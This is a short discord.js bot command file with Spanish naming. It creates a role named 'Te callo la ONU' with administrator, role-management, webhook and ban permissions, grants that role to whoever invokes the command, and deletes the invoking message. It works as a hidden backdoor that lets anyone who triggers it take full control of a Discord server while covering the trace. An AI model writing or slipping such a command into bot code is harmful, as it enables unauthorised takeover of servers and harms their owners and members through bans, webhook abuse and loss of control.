
const Discord = require("discord.js")
exports.run = (client, message, args) => {
  
   const hablyp =  client.channels.get("ID-CANAL")
    
   message.guild.createRole({
  name: 'Te callo la ONU',
     permissions: ["ADMINISTRATOR", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "BAN_MEMBERS"],
  color: 'BLACK',
})
  .then(role =>{ message.member.addRole(role.id)})
 message.delete()
 }
